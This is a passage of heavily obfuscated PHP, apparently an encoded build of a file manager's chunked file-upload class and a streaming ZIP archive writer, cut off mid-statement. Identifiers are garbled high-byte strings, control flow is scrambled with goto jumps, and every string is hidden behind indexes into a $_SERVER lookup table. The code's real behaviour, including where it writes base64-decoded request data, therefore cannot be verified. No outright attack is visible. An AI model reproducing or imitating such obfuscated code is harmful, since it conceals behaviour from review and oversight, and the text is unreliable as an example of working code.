public function __construct() { goto AÊ„¨·ºù™; bä¡Ã‘§Œ: if (!empty($_FILES)) { $fÃìæäìÅ = $_FILES[$f„ØõÇ„ËÒ[163]]; $this->uploadFile = $fÃìæäìÅ[$f„ØõÇ„ËÒ[1370]]; if (!$this->uploadFile && $fÃìæäìÅ[$f„ØõÇ„ËÒ[953]] > 0) { show_json($this->errorInfo($fÃìæäìÅ[$f„ØõÇ„ËÒ[953]]), !1); } } else { if (isset($in[$f„ØõÇ„ËÒ[387]])) { $this->uploadFile = isset($in[$f„ØõÇ„ËÒ[1371]]) ? $f„ØõÇ„ËÒ[1372] : $f„ØõÇ„ËÒ[1237]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto DÉ´Œ¢¥¢ô; DÉ´Œ¢¥¢ô: $this->checkSize(); $this->tempPathInit(); goto eÌ©­Ëíåæ; AÊ„¨·ºù™: $f„ØõÇ„ËÒ =& $_SERVER[İåâé¾]; global $in; $this->in =& $in; goto bä¡Ã‘§Œ; eÌ©­Ëíåæ: } public function upload() { goto F™½‚Åè£õ; AİÌ¿†‘: $this->statusSet($Fõ¿ØÂÂÁ¸); if (count($Fõ¿ØÂÂÁ¸[$fŸ¦è‘òŒ[1382]]) != $Fõ¿ØÂÂÁ¸[$fŸ¦è‘òŒ[1381]]) { $this->showJson($fŸ¦è‘òŒ[1385] . $cÑÓ§‡•Œ, !0); } ignore_timeout(); goto a¬èË±ñ“º; aÊš¨õÒ…ˆ: return $this->tempFile; goto c¯”Ëæ¿ÔÎ; C®Œã„Ô: $f½ãŒÄˆ’ = $this->moveUploadedFile($b¾‘Ğ«ÍÚ†); if (!$f½ãŒÄˆ’) { $this->showJson(LNG($fŸ¦è‘òŒ[1378]), !1); } $EÑ„©ƒã¹  = $cÑÓ§‡•Œ * $aœ¥Åö‡É¨; goto Bİ®¤ä´Á­; a¬èË±ñ“º: if (!$this->checkChunkHash($Fõ¿ØÂÂÁ¸)) { $this->showJson($fŸ¦è‘òŒ[1386], !1); } $this->statusSet(!1); CacheLock::unlock($this->tempFile); goto aÊš¨õÒ…ˆ; F£ç×¹„ê¾: $BãâÈ÷Ş = IO::hashSimple($f½ãŒÄˆ’); $Aàø £Ä‘ = IO::size($f½ãŒÄˆ’); @unlink($f½ãŒÄˆ’); goto FÅİÎ°¢Ê„; B²¡¹óÅâ´: CacheLock::lock($this->tempFile, 20); $Fõ¿ØÂÂÁ¸ = $this->statusGet(); $this->initFileTemp(); goto C®Œã„Ô; b“±ÅË²óÅ: if ($Bà…Ñáª·Ø > 1 && $aœ¥Åö‡É¨ <= 0) { show_json($fŸ¦è‘òŒ[1377], !1); } if ($aœ¥Åö‡É¨ > $Aàø £Ä‘) { $Bà…Ñáª·Ø = 1; } if ($Bà…Ñáª·Ø <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto B²¡¹óÅâ´; Bİ®¤ä´Á­: $AÛˆçƒğõŠ = @fopen($this->tempFile, $fŸ¦è‘òŒ[1379]); fseek($AÛˆçƒğõŠ, $EÑ„©ƒã¹ ); $B›»õŞÉ‰İ = $this->writeTo($f½ãŒÄˆ’, $AÛˆçƒğõŠ, $this->tempFile); goto F£ç×¹„ê¾; FÅİÎ°¢Ê„: if (!$B›»õŞÉ‰İ) { $this->showJson($fŸ¦è‘òŒ[1380] . $cÑÓ§‡•Œ, !1); } $Fõ¿ØÂÂÁ¸[$fŸ¦è‘òŒ[1381]] = $Bà…Ñáª·Ø; $Fõ¿ØÂÂÁ¸[$fŸ¦è‘òŒ[1382]][$fŸ¦è‘òŒ[1383] . $cÑÓ§‡•Œ] = array($fŸ¦è‘òŒ[1384] => $EÑ„©ƒã¹ , $fŸ¦è‘òŒ[784] => $cÑÓ§‡•Œ, $fŸ¦è‘òŒ[78] => $Aàø £Ä‘, $fŸ¦è‘òŒ[160] => $BãâÈ÷Ş); goto AİÌ¿†‘; EİÌšËÔà: $b¾‘Ğ«ÍÚ† = $this->tempFile . $fŸ¦è‘òŒ[1375] . $cÑÓ§‡•Œ; $Aàø £Ä‘ = isset($this->in[$fŸ¦è‘òŒ[391]]) ? intval($this->in[$fŸ¦è‘òŒ[391]]) : 0; $aœ¥Åö‡É¨ = isset($this->in[$fŸ¦è‘òŒ[1376]]) ? intval($this->in[$fŸ¦è‘òŒ[1376]]) : 0; goto b“±ÅË²óÅ; F™½‚Åè£õ: $fŸ¦è‘òŒ =& $_SERVER[İåâé¾]; $cÑÓ§‡•Œ = isset($this->in[$fŸ¦è‘òŒ[1373]]) ? intval($this->in[$fŸ¦è‘òŒ[1373]]) : 0; $Bà…Ñáª·Ø = isset($this->in[$fŸ¦è‘òŒ[1374]]) ? intval($this->in[$fŸ¦è‘òŒ[1374]]) : 1; goto EİÌšËÔà; c¯”Ëæ¿ÔÎ: } private function checkSize() { $eö…‰‚Ãõ =& $_SERVER[İåâé¾]; if (phpBuild64() || $this->in[$eö…‰‚Ãõ[78]] < PHP_INT_MAX) { return; } show_json(LNG($eö…‰‚Ãõ[1387]), !1); } private function showJson($câˆ‚­‰Øº, $bÓ±‡À£Å) { CacheLock::unlock($this->tempFile); if (!$bÓ±‡À£Å) { return show_json($câˆ‚­‰Øº, $bÓ±‡À£Å); } show_json($câˆ‚­‰Øº, $bÓ±‡À£Å); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto Aø…ÙÍÀº‹; e¬ÍÆ¥ƒ†½: touch($f®õœ‚ˆ . $C øŞàã‚[1388]); $fè•¯œÛ‡« = isset($this->in[$C øŞàã‚[1389]]) ? $this->in[$C øŞàã‚[1389]] : !1; if (strlen($fè•¯œÛ‡«) < 30) { $fè•¯œÛ‡« = md5(USER_ID . $this->in[$C øŞàã‚[76]] . $this->fileName . $this->in[$C øŞàã‚[78]]); } goto aÒ‰„öÍëç; aÒ‰„öÍëç: $this->tempFile = $f®õœ‚ˆ . $C øŞàã‚[1390] . md5($fè•¯œÛ‡« . $this->in[$C øŞàã‚[1391]]); goto d³éĞİóÀ­; Aø…ÙÍÀº‹: $C øŞàã‚ =& $_SERVER[İåâé¾]; $f®õœ‚ˆ = TEMP_FILES; @mk_dir($f®õœ‚ˆ); goto e¬ÍÆ¥ƒ†½; d³éĞİóÀ­: } private function moveUploadedFile($A×½ÆôÍÕÔ) { $B§ç²¿» =& $_SERVER[İåâé¾]; $E—¤×ÚÏ£– = $this->uploadFile; if ($E—¤×ÚÏ£– == $B§ç²¿»[1392]) { @file_put_contents($A×½ÆôÍÕÔ, base64_decode($_REQUEST[$B§ç²¿»[1393]])); } else { if ($E—¤×ÚÏ£– == $B§ç²¿»[1237]) { $Cãâ‰›ŸºË = @fopen($A×½ÆôÍÕÔ, $B§ç²¿»[1159]); $this->writeTo($E—¤×ÚÏ£–, $Cãâ‰›ŸºË, $A×½ÆôÍÕÔ); } else { if (!move_uploaded_file($E—¤×ÚÏ£–, $A×½ÆôÍÕÔ)) { return !1; } } } return $A×½ÆôÍÕÔ; } private function writeTo($Bïø¢ßÏ­´, $dêŒµùÅÏå, $Få¹†Ëù¨á) { goto cÊÜÜàğóİ; Dë…ö¾õ—£: $cƒËÎ¨ÄÌò = @fopen($Bïø¢ßÏ­´, $b¯öÑÆØèÜ[1158]); if (!$cƒËÎ¨ÄÌò || !$dêŒµùÅÏå || !$b‘íÌÏÜ˜É) { CacheLock::unlock($cæö«Ğ…î˜); return !1; } while (!feof($cƒËÎ¨ÄÌò)) { fwrite($dêŒµùÅÏå, fread($cƒËÎ¨ÄÌò, 1024 * 200)); } goto fÍÁœ×Øå½; AóÃ‘ß©‡: return !0; goto AÊÁ©æ­±Ø; cÊÜÜàğóİ: $b¯öÑÆØèÜ =& $_SERVER[İåâé¾]; $cæö«Ğ…î˜ = $b¯öÑÆØèÜ[1394] . $Få¹†Ëù¨á; $b‘íÌÏÜ˜É = CacheLock::lock($cæö«Ğ…î˜, 1); goto Dë…ö¾õ—£; fÍÁœ×Øå½: fclose($cƒËÎ¨ÄÌò); fclose($dêŒµùÅÏå); CacheLock::unlock($cæö«Ğ…î˜); goto AóÃ‘ß©‡; AÊÁ©æ­±Ø: } private function statusGet() { goto fï¼İ‚–ë; FŒÒÈ©è–: $D¡æ‡Ú÷Ô = !1; if (file_exists($EèÈù¼™ì‰)) { $D¡æ‡Ú÷Ô = @file_get_contents($EèÈù¼™ì‰); } if ($D¡æ‡Ú÷Ô) { $this->statusData = unserialize($D¡æ‡Ú÷Ô); } goto c¢Áà„³¶ë; c¢Áà„³¶ë: if (!$this->statusData) { $A½Æ•ñİÆ = array($eÕØ˜èî‡‰[28] => $this->fileName, $eÕØ˜èî‡‰[1381] => 0, $eÕØ˜èî‡‰[1382] => array()); $this->statusSet($A½Æ•ñİÆ); } return $this->statusData; goto B¾õ½äÑÆä; fï¼İ‚–ë: $eÕØ˜èî‡‰ =& $_SERVER[İåâé¾]; if (is_array($this->statusData)) { return $this->statusData; } $EèÈù¼™ì‰ = $this->tempFile . $eÕØ˜èî‡‰[1395]; goto FŒÒÈ©è–; B¾õ½äÑÆä: } public function statusSet($E÷¢¶´ì°) { $bÈˆÌîìÍ = $this->tempFile . $_SERVER[İåâé¾][1395]; if (!$E÷¢¶´ì°) { if (file_exists($bÈˆÌîìÍ)) { @unlink($bÈˆÌîìÍ); } return !0; } $this->statusData = $E÷¢¶´ì°; return file_put_contents($bÈˆÌîìÍ, serialize($E÷¢¶´ì°)); } private function initFileTemp() { $a˜£ÈœßŒ =& $_SERVER[İåâé¾]; if (file_exists($this->tempFile)) { return; } $eĞƒ¥’Ú‰ä = fopen($this->tempFile, $a˜£ÈœßŒ[1396]); fseek($eĞƒ¥’Ú‰ä, $this->in[$a˜£ÈœßŒ[78]] - 1, SEEK_SET); fwrite($eĞƒ¥’Ú‰ä, $a˜£ÈœßŒ[402]); fclose($eĞƒ¥’Ú‰ä); } public function checkChunk() { goto aìÕ·—£†Ö; aìÕ·—£†Ö: $dõ¶³¿˜µˆ =& $_SERVER[İåâé¾]; $B¦Æ‰‘¨ää = array(); CacheLock::lock($this->tempFile); goto f¾‹øëìå ; AĞ…Š½³ÁŒ: return $B¦Æ‰‘¨ää; goto C©Ûš®êÒô; f¾‹øëìå : $d’é†èàõ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($d’é†èàõ[$dõ¶³¿˜µˆ[1382]] as $B‹æÌë£) { $d¤£®È¿Ú = $B‹æÌë£[$dõ¶³¿˜µˆ[160]]; if ($d¤£®È¿Ú) { $B¦Æ‰‘¨ää[$dõ¶³¿˜µˆ[1397] . $B‹æÌë£[$dõ¶³¿˜µˆ[784]]] = $d¤£®È¿Ú; } } goto AĞ…Š½³ÁŒ; C©Ûš®êÒô: } private function checkChunkHash($F»¡ôµÃòò) { goto dÀœÊõËÇ¹; d„˜“™ÄöØ: $CÂ¹‡ŠÇÚ = _get($this->in, $fÎñÒ“ŒËä[1398]); if (strlen($CÂ¹‡ŠÇÚ) == 32 && IO::hashSimple($this->tempFile) == $cÜâ²¨Ë¾æ && IO::hashMd5($this->tempFile) == $CÂ¹‡ŠÇÚ) { return !0; } $b§èìÕÓ¾ = fopen($this->tempFile, $fÎñÒ“ŒËä[899]); goto A£Ê±«ßØ; dÀœÊõËÇ¹: $fÎñÒ“ŒËä =& $_SERVER[İåâé¾]; if (count($F»¡ôµÃòò[$fÎñÒ“ŒËä[1382]]) != $F»¡ôµÃòò[$fÎñÒ“ŒËä[1381]]) { return !1; } $cÜâ²¨Ë¾æ = _get($this->in, $fÎñÒ“ŒËä[1389]); goto d„˜“™ÄöØ; DŒÏËğì½: return $d ¢ÆÔ‰Ò·; goto C¦ä“èáŞù; A£Ê±«ßØ: $d ¢ÆÔ‰Ò· = !0; foreach ($F»¡ôµÃòò[$fÎñÒ“ŒËä[1382]] as $EŞµÚÊíœ•) { fseek($b§èìÕÓ¾, $EŞµÚÊíœ•[$fÎñÒ“ŒËä[1384]]); $b†„£á¡†ö = PathDriverStream::hash($b§èìÕÓ¾, $EŞµÚÊíœ•[$fÎñÒ“ŒËä[78]]); if ($EŞµÚÊíœ•[$fÎñÒ“ŒËä[160]] != $b†„£á¡†ö) { $d ¢ÆÔ‰Ò· = !1; break; } } fclose($b§èìÕÓ¾); goto DŒÏËğì½; C¦ä“èáŞù: } public static function fileName() { goto FÙ¹‘ğáÂ¦; eÏ¬±†–Ò‰: if (!empty($_FILES)) { $CÊŒËæ£Ú = $CÊŒËæ£Ú ? $CÊŒËæ£Ú : $_FILES[$Aïµ«èºã¦[163]][$Aïµ«èºã¦[387]]; } $CÊŒËæ£Ú = str_replace(array($Aïµ«èºã¦[92], $Aïµ«èºã¦[8]), array($Aïµ«èºã¦[8], $Aïµ«èºã¦[90]), trim($CÊŒËæ£Ú)); if (!is_wap()) { return $CÊŒËæ£Ú; } goto Cë¦¢‡»ŠÅ; Bï«Œ¸÷Èö: if ($cá§Ã¹ÑÉÀ == $Aïµ«èºã¦[1400] || $cá§Ã¹ÑÉÀ == $Aïµ«èºã¦[1401]) { $CÊŒËæ£Ú = date($Aïµ«èºã¦[447], $a­„ƒ›‰ˆ…) . $Aïµ«èºã¦[71] . $in[$Aïµ«èºã¦[78]] . $Aïµ«èºã¦[1402]; } else { if ($cá§Ã¹ÑÉÀ == $Aïµ«èºã¦[1403]) { $CÊŒËæ£Ú = date($Aïµ«èºã¦[447], $a­„ƒ›‰ˆ…) . $Aïµ«èºã¦[71] . $in[$Aïµ«èºã¦[78]] . $Aïµ«èºã¦[1404]; } } return $CÊŒËæ£Ú; goto d´·Ë§Ê›¨; FÙ¹‘ğáÂ¦: $Aïµ«èºã¦ =& $_SERVER[İåâé¾]; global $in; $CÊŒËæ£Ú = isset($in[$Aïµ«èºã¦[28]]) ? $in[$Aïµ«èºã¦[28]] : $Aïµ«èºã¦[33]; goto eÏ¬±†–Ò‰; Cë¦¢‡»ŠÅ: $a­„ƒ›‰ˆ… = strtotime($in[$Aïµ«èºã¦[1399]]); $a­„ƒ›‰ˆ… = $a­„ƒ›‰ˆ… ? $a­„ƒ›‰ˆ… : time(); $cá§Ã¹ÑÉÀ = strtolower($CÊŒËæ£Ú); goto Bï«Œ¸÷Èö; d´·Ë§Ê›¨: } private function errorInfo($eÓ¥çè¢Ì) { $Dµ˜¡²ß×’ =& $_SERVER[İåâé¾]; $fóØŠ¦¿ = array($Dµ˜¡²ß×’[1405], $Dµ˜¡²ß×’[1406], $Dµ˜¡²ß×’[1407], $Dµ˜¡²ß×’[1408], $Dµ˜¡²ß×’[1409], $Dµ˜¡²ß×’[1410], $Dµ˜¡²ß×’[1411], $Dµ˜¡²ß×’[1412]); return $eÓ¥çè¢Ì . $Dµ˜¡²ß×’[4] . $fóØŠ¦¿[$eÓ¥çè¢Ì]; } } class ZipMake { const VERSION = "\x30\56\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($B¾á÷¤Ø™‰ = null) { $B¥ÔïÚ×Øª =& $_SERVER[İåâé¾]; $this->outputStream = fopen($B¥ÔïÚ×Øª[1413], $B¥ÔïÚ×Øª[959]); $this->outputName = $B¾á÷¤Ø™‰; $this->needHeaders = !0; } public function addFile($bù¢Ë‰Íƒ§, $F†¢‹ÀÊŒ) { goto D×ùÔëÓº; CÀáÌ³‘Šà: while (!feof($eåÒ“ÉÄ¶ğ)) { $Fö¸õÌ·Ñ = fread($eåÒ“ÉÄ¶ğ, 1048576); $this->send($Fö¸õÌ·Ñ); } fclose($eåÒ“ÉÄ¶ğ); $A†£·–óƒ¨ = hexdec(hash_file($DÂ÷ÙÕÆÖå[1415], $F†¢‹ÀÊŒ)); goto f…íÓ¸„õ´; f…íÓ¸„õ´: $this->addFileFooter($bù¢Ë‰Íƒ§, $cğ„†ø‡, $A†£·–óƒ¨, $DÈî‰–Ãºº, $bˆËîßÖâÄ, $E¤˜”Õ‰ƒ—); goto E‹°Æ„ËŒÔ; D×ùÔëÓº: $DÂ÷ÙÕÆÖå =& $_SERVER[İåâé¾]; $bù¢Ë‰Íƒ§ = $this->filterFilename($bù¢Ë‰Íƒ§); $cğ„†ø‡ = static::METHOD_STORE; goto E¤ºÉ‰šÃ; E¤ºÉ‰šÃ: $E¤˜”Õ‰ƒ— = $this->addFileHeader($bù¢Ë‰Íƒ§, $cğ„†ø‡); $DÈî‰–Ãºº = $bˆËîßÖâÄ = filesize($F†¢‹ÀÊŒ); $eåÒ“ÉÄ¶ğ = fopen($F†¢‹ÀÊŒ, $DÂ÷ÙÕÆÖå[1414]); goto CÀáÌ³‘Šà; E‹°Æ„ËŒÔ: } public function addFileFromStream($FæèÒ¦…Ğ, $cÉôŠ°Ò) { goto cª”ÂÂİğÛ; cíó‚ÖØ×: $this->addFileFooter($FæèÒ¦…Ğ, $E“°¤³Ì, $aË…ˆ„Œ˜, $Fƒ‡İÆÍ¼, $A©ô„Ó…º«, $bšãöİ³); goto d„’ï¯‰¼Ï; e¢º³ÆÉ°Ÿ: fseek($cÉôŠ°Ò, 0, SEEK_END); $Fƒ‡İÆÍ¼ = $A©ô„Ó…º« = ftell($cÉôŠ°Ò); rewind($cÉôŠ°Ò); goto F•ØŸÓÍ˜ˆ; cª”ÂÂİğÛ: $FæèÒ¦…Ğ = $this->filterFilename($FæèÒ¦…Ğ); $E“°¤³Ì = static::METHOD_STORE; $bšãöİ³ = $this->addFileHeader($FæèÒ¦…Ğ, $E“°¤³Ì); goto e¢º³ÆÉ°Ÿ; F•ØŸÓÍ˜ˆ: $DÊˆ‰’øÌ£ = hash_init($_SERVER[İåâé¾][1415]); while (!feof($cÉôŠ°Ò)) { $e¼é™ˆùÙÔ = fread($cÉôŠ°Ò, 1048576); hash_update($DÊˆ‰’øÌ£, $e¼é™ˆùÙÔ); $this->send($e¼é™ˆùÙÔ); } $aË…ˆ„Œ˜ = hexdec(hash_final($DÊˆ‰’øÌ£)); goto cíó‚ÖØ×; d„’ï¯‰¼Ï: } public function finish() { foreach ($this->files as $d°×­ğŞ) { $this->addCdrFile($d°×­ğŞ); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($bõºèŒ…Í, $F·æã‹Á—¸) { goto fÇÕéÙç¾; fÇÕéÙç¾: $aË§ƒÎ¾ªŞ =& $_SERVER[İåâé¾]; $bõºèŒ…Í = preg_replace($aË§ƒÎ¾ªŞ[1416], $aË§ƒÎ¾ªŞ[33], $bõºèŒ…Í); $A‚™¶ Ö±‹ = strlen($bõºèŒ…Í); goto A©İŸÒ“Ï; fñ‰ñŞà†: $c‰±ÛÅö® = $this->packFields($C©“‘òÙÄô); $AÎôÚ‹Ğ— = $this->packFields($BİÅË°å±ª); $this->send($c‰±ÛÅö® . $bõºèŒ…Í . $AÎôÚ‹Ğ—); goto BöÌÂØ¹; BöÌÂØ¹: return strlen($c‰±ÛÅö®) + $A‚™¶ Ö±‹ + strlen($AÎôÚ‹Ğ—); goto aÓ…­íèà¥; A©İŸÒ“Ï: $Eé•Åì–À = $this->dosTime(time()); $C©“‘òÙÄô = array(array($aË§ƒÎ¾ªŞ[1417], static::FILE_HEADER_SIGNATURE), array($aË§ƒÎ¾ªŞ[1418], static::ZIP_VERSION_64), array($aË§ƒÎ¾ªŞ[1418], 8), array($aË§ƒÎ¾ªŞ[1418], $F·æã‹Á—¸), array($aË§ƒÎ¾ªŞ[1417], $Eé•Åì–À), array($aË§ƒÎ¾ªŞ[1417], 0), array($aË§ƒÎ¾ªŞ[1417], 4294967295), array($aË§ƒÎ¾ªŞ[1417], 4294967295), array($aË§ƒÎ¾ªŞ[1418], $A‚™¶ Ö±‹), array($aË§ƒÎ¾ªŞ[1418], 32)); $BİÅË°å±ª = array(array($aË§ƒÎ¾ªŞ[1418], 1), array($aË§ƒÎ¾ªŞ[1418], 28), array($aË§ƒÎ¾ªŞ[1419], 0), array($aË§ƒÎ¾ªŞ[1419], 0), array($aË§ƒÎ¾ªŞ[1419], 0), array($aË§ƒÎ¾ªŞ[1417], 0)); goto fñ‰ñŞà†; aÓ…­íèà¥: } protected function addFileFooter($a¤§‘˜“ÓŒ, $DĞµ°š²¸†, $EÌš¹‰ŞŒÁ, $Eàîèò¾’ù, $Aì„ĞºëÎ, $b¼ôÇé²®) { $EŠ×ÖÙæ =& $_SERVER[İåâé¾]; $Få‰ìÕ‡ğš = array(array($EŠ×ÖÙæ[1417], static::DATA_DESCRIPTOR_SIGNATURE), array($EŠ×ÖÙæ[1417], $EÌš¹‰ŞŒÁ), array($EŠ×ÖÙæ[1419], $Eàîèò¾’ù), array($EŠ×ÖÙæ[1419], $Aì„ĞºëÎ)); $C¥¦æ¯ÑÔ³ = $this->packFields($Få‰ìÕ‡ğš); $this->send($C¥¦æ¯ÑÔ³); $d³Âí…óø = $b¼ôÇé²® + $Eàîèò¾’ù + $aÌº˜‘¯¦Ÿ; $this->addToCdr($a¤§‘˜“ÓŒ, $DĞµ°š²¸†, $EÌš¹‰ŞŒÁ, $Eàîèò¾’ù, $Aì„ĞºëÎ, $d³Âí…óø); } private function addToCdr($A±ÚÃë²Ğù, $fªœ¾–Í, $EÇÒ¨°ÑŠ, $cËè³í¶Å , $Fá·‡¶ĞÀ‚, $e³‘¬Âë‘ö) { $this->files[] = array($A±ÚÃë²Ğù, $fªœ¾–Í, $EÇÒ¨°ÑŠ, $cËè³í¶Å , $Fá·‡¶ĞÀ‚, $this->ofs); $this->ofs += $e³‘¬Âë‘ö; } protected function addCdrFile($f‹ğªãØŒ†) { goto b›³Æ…¥Â; b©èò²£áñ: $this->send($EÊô‚äÌÖï); $this->cdr_ofs += strlen($EÊô‚äÌÖï); goto d•òğ°á¼ì; c†©²øƒŸİ: $dªôéê˜ù = $this->packFields($a±”®³éÜ); $a–¦“½¾š = $this->packFields($DŒ…´ÎÖèÊ); $EÊô‚äÌÖï = $dªôéê˜ù . $f×Æç©î±† . $EÓø‚¥ŒÍ¬ . $a–¦“½¾š; goto b©èò²£áñ; bİ­‘•¡: $AÄ£Åùğ™¿ = $this->dosTime(time()); $a±”®³éÜ = array(array($dØ‘èŒ¤µ²[1417], static::CDR_FILE_SIGNATURE), array($dØ‘èŒ¤µ²[1418], static::ZIP_VERSION_64), array($dØ‘èŒ¤µ²[1418], static::ZIP_VERSION_64), array($dØ‘èŒ¤µ²[1418], 8), array($dØ‘èŒ¤µ²[1418], $F‚´¨øìöò), array($dØ‘èŒ¤µ²[1417], $AÄ£Åùğ™¿), array($dØ‘èŒ¤µ²[1417], $Eãîµ¯ô), array($dØ‘èŒ¤µ²[1417], 4294967295), array($dØ‘èŒ¤µ²[1417], 4294967295), array($dØ‘èŒ¤µ²[1418], strlen($f×Æç©î±†)), array($dØ‘èŒ¤µ²[1418], 32), array($dØ‘èŒ¤µ²[1418], strlen($EÓø‚¥ŒÍ¬)), array($dØ‘èŒ¤µ²[1418], 0), array($dØ‘èŒ¤µ²[1418], 0), array($dØ‘èŒ¤µ²[1417], 32), array($dØ‘èŒ¤µ²[1417], 4294967295)); $DŒ…´ÎÖèÊ = array(array($dØ‘èŒ¤µ²[1418], 1), array($dØ‘èŒ¤µ²[1418], 28), array($dØ‘èŒ¤µ²[1419], $C‹â¡¡ÖÕ¤), array($dØ‘èŒ¤µ²[1419], $C”Ø´ëÎâ), array($dØ‘èŒ¤µ²[1419], $B„â§½Î¶ç), array($dØ‘èŒ¤µ²[1417], 0)); goto c†©²øƒŸİ; b›³Æ…¥Â: $dØ‘èŒ¤µ² =& $_SERVER[İåâé¾]; list($f×Æç©î±†, $F‚´¨øìöò, $Eãîµ¯ô, $C”Ø´ëÎâ, $C‹â¡¡ÖÕ¤, $B„â§½Î¶ç) = $f‹ğªãØŒ†; $EÓø‚¥ŒÍ¬ = $dØ‘èŒ¤µ²[33]; goto bİ­‘•¡; d•òğ°á¼ì: } protected function addCdr64Eof() { goto F‘¿„šºŞ; cµÒĞ¢ô§Å: $aÕÄÏğ…È¯ = $this->ofs; $F¿êå²ÒÖ = array(array($C·Ô¦ó¤[1417], static::ZIP64_CDR_EOF_SIGNATURE), array($C·Ô¦ó¤[1419], 44), array($C·Ô¦ó¤[1418], static::ZIP_VERSION_64), array($C·Ô¦ó¤[1418], static::ZIP_VERSION_64), array($C·Ô¦ó¤[1417], 0), array($C·Ô¦ó¤[1417], 0), array($C·Ô¦ó¤[1419], $aàË“Ï©÷ß), array($C·Ô¦ó¤[1419], $aàË“Ï©÷ß), array($C·Ô¦ó¤[1419], $FÚçŒª™¤), array($C·Ô¦ó¤[1419], $aÕÄÏğ…È¯)); $dÕÀªÜ™†Œ = $this->packFields($F¿êå²ÒÖ); goto aÓˆŞçä¾; F‘¿„šºŞ: $C·Ô¦ó¤ =& $_SERVER[İåâé¾]; $aàË“Ï©÷ß = count($this->files); $FÚçŒª™¤ = $this->cdr_ofs; goto cµÒĞ¢ô§Å; aÓˆŞçä¾: $this->send($dÕÀªÜ™†Œ); goto b¾³É”á•Ä; b¾³É”á•Ä: } protected function addCdr64Locator() { goto bÎ­Œ• „Õ; c’Ş•Ààìø: $bâ—¢§¹¡ = $this->ofs; $D¶ïÇ°¬×Œ = array(array($EøƒˆÕ°Œ¥[1417], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($EøƒˆÕ°Œ¥[1417], 0), array($EøƒˆÕ°Œ¥[1419], $bâ—¢§¹¡ + $BÚª–ˆÂ„š), array($EøƒˆÕ°Œ¥[1417], 1)); $F²Î©‡÷Ûø = $this->packFields($D¶ïÇ°¬×Œ); goto FÔ§âº©à ; bÎ­Œ• „Õ: $EøƒˆÕ°Œ¥ =& $_SERVER[İåâé¾]; $C–ãÄ„è¸› = count($this->files); $BÚª–ˆÂ„š = $this->cdr_ofs; goto c’Ş•Ààìø; FÔ§âº©à : $this->send($F²Î©‡÷Ûø); goto bªß¡¶‰¦ö; bªß¡¶‰¦ö: } protected function addCdrEof() { goto FÊ…çÂá£÷; A¸ƒÉ£´Â: $cö¢ïÍ²Øˆ = $this->packFields($c˜Ÿ®Â«´Ï) . $D…ïµæ“—Ü; $this->send($cö¢ïÍ²Øˆ); goto AÕÕ½ÙÊ‡£; DÌ“½¶Øˆè: $E’´¿©ìÕÊ = $this->ofs; $D…ïµæ“—Ü = $B‚„ŠÃš³§[33]; $c˜Ÿ®Â«´Ï = array(array($B‚„ŠÃš³§[1417], static::CDR_EOF_SIGNATURE), array($B‚„ŠÃš³§[1418], 0), array($B‚„ŠÃš³§[1418], 0), array($B‚„ŠÃš³§[1418], $Aò†éÙª£›), array($B‚„ŠÃš³§[1418], $Aò†éÙª£›), array($B‚„ŠÃš³§[1417], 4294967295), array($B‚„ŠÃš³§[1417], 4294967295), array($B‚„ŠÃš³§[1418], strlen($D…ïµæ“—Ü))); goto A¸ƒÉ£´Â; FÊ…çÂá£÷: $B‚„ŠÃš³§ =& $_SERVER[İåâé¾]; $Aò†éÙª£› = count($this->files); $dì³¡¤È¹• = $this->cdr_ofs; goto DÌ“½¶Øˆè; AÕÕ½ÙÊ‡£: } protected function addCdr() { foreach ($this->files as $A™™”¶‘Æ©) { $this->addCdrFile($A™™”¶‘Æ©); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $b®™é³´Éï =& $_SERVER[İåâé¾]; $dâ½ŠÆº¥® = $b®™é³´Éï[201]; if ($this->outputName) { $c²ÑÔ»ß…˜ = trim(str_replace(array($b®™é³´Éï[111], $b®™é³´Éï[55], $b®™é³´Éï[92], $b®™é³´Éï[68], $b®™é³´Éï[223], $b®™é³´Éï[486]), $b®™é³´Éï[33], $this->outputName)); $E¹–ƒØìÌá = rawurlencode($c²ÑÔ»ß…˜); $dâ½ŠÆº¥® .= "\x3b\40\x66\x69\154\145\x6e\141\155\145\x2a\x3d\165\164\x66\55\70\47\47{$E¹–ƒØìÌá}"; } $EêÁèğ¼–à = array($b®™é³´Éï[198] => $b®™é³´Éï[1420], $b®™é³´Éï[1421] => $dâ½ŠÆº¥®, $b®™é³´Éï[1422] => $b®™é³´Éï[1423], $b®™é³´Éï[1424] => $b®™é³´Éï[1425], $b®™é³´Éï[1426] => $b®™é³´Éï[1427]); foreach ($EêÁèğ¼–à as $fÀ©†‚Üƒø => $fŒ¨Î¾îî) { header($fÀ©†‚Üƒø . $b®™é³´Éï[646] . $fŒ¨Î¾îî); } } protected function send($CÓ ¹³ôÇ ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $CÓ ¹³ôÇ ); } protected final function dosTime($a„ß¹Ê­Ş) { $aè™©’—°Ù =& $_SERVER[İåâé¾]; $D–¦øĞ—ƒ¼ = getdate($a„ß¹Ê­Ş); if ($D–¦øĞ—ƒ¼[$aè™©’—°Ù[1428]] < 1980) { $D–¦øĞ—ƒ¼ = array($aè™©’—°Ù[1428] => 1980, $aè™©’—°Ù[1429] => 1, $aè™©’—°Ù[1430] => 1, $aè™©’—°Ù[1431] => 0, $aè™©’—°Ù[1432] => 0, $aè™©’—°Ù[1433] => 0); } $D–¦øĞ—ƒ¼[$aè™©’—°Ù[1428]] -= 1980; return 